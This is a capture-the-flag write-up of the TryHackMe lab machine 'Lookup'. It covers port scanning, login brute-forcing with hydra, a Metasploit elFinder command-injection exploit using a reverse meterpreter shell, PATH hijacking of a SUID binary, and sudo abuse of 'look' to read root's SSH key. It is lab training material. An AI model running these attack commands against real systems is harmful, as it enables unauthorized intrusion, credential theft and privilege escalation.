---
title: Lookup
description: Writeup for the TryHackMe machine Lookup
date: 2024-11-22
categories: [TryHackMe]
tags: [try-hack-me,thm,bute-force]
---

## Recon

### nmap

`nmap` finds two open ports: SHH (22) and HTTP (80).
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Login Page
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

### Subdomain Fuzz

The web server redirects to `lookup.thm`. Fuzzing for subdomains reveals no additional subdomains.

### lookup.thm - TCP 80

The web server presents a login form.

## Shell as www-data

The login form allows username enumeration:
- Submitting `admin:admin` returns `Wrong password`.
- Submitting `doesnotexist:password` returns `Wrong username or password`.

Using `hydra`, I brute-force the password for the user `admin`:
```console
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password" -V -F
[...]
[80][http-post-form] host: lookup.thm   login: admin   password: <REDACTED>
```
However, the credentials `admin:<REDACTED>` do not work on the login form. Assuming the password might belong to another user, I proceed to enumerate valid usernames:
```console
$ hydra -L /usr/share/wordlists/seclists/usernames.txt -p <REDACTED> lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong username or password" -V -F
[...]
[80][http-post-form] host: lookup.thm   login: jose   password: <REDACTED>
```
Logging in with the credentials `jose:<REDACTED>` redirects to `files.lookup.thm`, hosting the File Manager `elFinder 2.1.47`. 

A search for vulnerabilities reveals CVE-2019-9194, which is exploitable via the Metasploit module `unix/webapp/elfinder_php_connector_exiftran_cmd_injection`:
```console
msf6 > use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set LHOST tun0
LHOST => 10.x.x.x
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set VHOST files.lookup.thm
VHOST => files.lookup.thm
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > set RHOSTS 10.x.x.x
RHOSTS => 10.x.x.x
msf6 exploit(unix/webapp/elfinder_php_connector_exiftran_cmd_injection) > run
```

## Shell as think

`linpeas` identifies an unknown SUID binary:
```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                                                                            
[...]
-rwsr-sr-x 1 root root 17K Jan 11  2024 /usr/sbin/pwm (Unknown SUID binary!)
```
Using `strings`, I observe that the binary executes the `id` command to extract the username and reads `.passwords` in the user's home directory.
```console
$ strings /usr/sbin/pwm
[...]
[!] Running 'id' command to extract the username and user ID (UID)
[-] Error executing id command
uid=%*u(%[^)])
[-] Error reading username from id command
[!] ID: %s
/home/%s/.passwords
[-] File /home/%s/.passwords not found
[...]
```
Analysis with `Ghidra` confirms that `id` is executed without an absolute path.
![](/assets/img/thm-lookup-id.png)
I exploit this by creating a malicious `id` script:
```shell
#!/bin/bash
echo "uid=33(think) gid=33(think) groups=33(think)"
```
{: file="id" }
After adding the directory containing the script in my `PATH`, I execute the binary:
```console
$ export PATH=/tmp:$PATH
$ /usr/sbin/pwm
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
```
Using the output as a password list, I brute-force the SSH password for the user `think`:
```console
$ hydra -l think -P wordlist.txt lookup.thm ssh -V -F
[...]
[22][ssh] host: lookup.thm   login: think   password: <REDACTED>
```

## Shell as root

The user `think` can execute `/usr/bin/look` as root:
```console
think@lookup:~$ sudo -l
Matching Defaults entries for think on lookup:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```
[GTFOBins](https://gtfobins.github.io/gtfobins/look/) contains an entry for `look` which allows reading arbitrary files.
```console
think@lookup:~$ sudo look '' "/root/.ssh/id_rsa"
-----BEGIN OPENSSH PRIVATE KEY-----
[...]
-----END OPENSSH PRIVATE KEY-----
```
I save the private key locally and use it to connect as `root`:
```console
$ nano id_rsa
$ chmod 600 id_rsa
$ ssh -i id_rsa root@lookup.thm
```
